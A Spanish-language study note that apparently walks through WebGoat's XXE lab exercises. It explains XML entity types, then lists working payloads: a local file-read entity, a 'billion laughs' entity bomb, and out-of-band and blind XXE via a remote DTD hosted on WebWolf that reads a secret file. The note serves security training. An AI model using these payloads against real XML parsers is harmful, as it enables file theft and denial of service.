# XML External Entities (XXE)

## ¿Qué son?
Definición de etiquetas que serán reemplazadas al leer un XML. Hay 3 tipos.
+ entidades internas
+ entidades externas
+ entidades de parámetros

```xml
<?xml version="1.0" standalone="yes" ?>
<!DOCTYPE author [
  <!ELEMENT author (#PCDATA)>
  <!ENTITY js "Jo Smith">
]>
<author>&js;</author>
```

En todos los lugares que se utiliza `&js;` el analizador lo reemplazará.

## Tipos de ataques XXE
+ Clásico: en este caso, se incluye una entidad externa en un DTD local
+ Ciego: no se muestran resultados ni errores en la respuesta
+ Error: intente obtener el contenido de un recurso en el mensaje de error

*********************************************************************

# Let's try (3)
```xml
<?xml version="1.0"?>
<!DOCTYPE comment [
<!ENTITY xxe SYSTEM "/">
]>
<comment><text>&xxe;</text></comment>
```

*********************************************************************

# Códigos XXE interesantes

## XXE DOS attack
```xml
<?xml version="1.0"?>
<!DOCTYPE lolz [
 <!ENTITY lol "lol">
 <!ELEMENT lolz (#PCDATA)>
 <!ENTITY lol1 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;">
 <!ENTITY lol2 "&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;">
 <!ENTITY lol3 "&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;">
 <!ENTITY lol4 "&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;">
 <!ENTITY lol5 "&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;">
 <!ENTITY lol6 "&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;">
 <!ENTITY lol7 "&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;">
 <!ENTITY lol8 "&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;">
 <!ENTITY lol9 "&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;">
]>
<lolz>&lol9;</lolz>
```

*******************************************************************

## attack.dtd
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!ENTITY ping SYSTEM 'http://127.0.0.1:9090/landing'>
```

## Ahora envíe el formulario, cambie el xml usando a:
```xml
<?xml version="1.0"?>
<!DOCTYPE root [
<!ENTITY % remote SYSTEM "http://127.0.0.1:9090/WebWolf/files/attack.dtd">
%remote;
]>
<comment>
  <text>test&ping;</text>
</comment>
```

## Ahora en WebWolf busque 'requests' y verá:
```json
{
  "method" : "GET",
  "path" : "/landing",
  "headers" : {
    "request" : {
      "user-agent" : "Mozilla/5.0 (X11; Linux x86_64; rv:52.0) Gecko/20100101 Firefox/52.0",
    },
  },
  "parameters" : {
    "test" : [ "HelloWorld" ],
  },
  "timeTaken" : "1"
}

```

*********************************************************************

# Blind XXE assignment (7)

## Creamos un archivo con nuestro payload en nuestro webwolft

## attack2.dtd
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!ENTITY cat SYSTEM '/home/user/.webgoat-@project.version@//XXE/secret.txt'>
```

## Modificamos la petición por el siguiente payload
```xml
<?xml version="1.0"?>
<!DOCTYPE root [
<!ENTITY % remote SYSTEM "http://127.0.0.1:9090/WebWolf/files/attack2.dtd">
%remote;
]>
<comment>
  <text>&cat;</text>
</comment>
```

*********************************************************************

# Referencias interesantes
+ https://enciphers.com/how-to-exploit-xxe-vulnerabilities/
+ https://blog.netspi.com/playing-content-type-xxe-json-endpoints/
+ https://bookgin.tw/2018/12/04/from-xxe-to-rce-pwn2win-ctf-2018-writeup/
+ https://web-in-security.blogspot.com/2016/03/xxe-cheat-sheet.html